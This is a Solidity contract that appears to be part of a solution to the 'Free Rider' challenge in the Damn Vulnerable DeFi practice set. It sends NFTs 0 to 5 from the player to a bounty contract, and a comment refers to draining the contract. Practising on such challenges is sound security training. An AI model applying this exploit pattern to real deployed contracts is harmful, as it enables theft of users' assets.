// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableNFT.sol";

contract FreeRiderHack {
    using Address for address payable;

    DamnValuableNFT public token;
    address public devContract;
    address public player;


    constructor(address playerAddress, address nftToken, address devContractAddress) {
        player = playerAddress;
        token = DamnValuableNFT(nftToken);
        devContract = devContractAddress;
    }

    function executeQueueAction() external {
        if(msg.sender != player)
            revert();
        bytes memory data = abi.encode(player);
        // Put the below in a loop to drain the contract
        for (uint i = 0; i < 6; i++) {
            token.safeTransferFrom(player, devContract, i, data);
        }
    }
}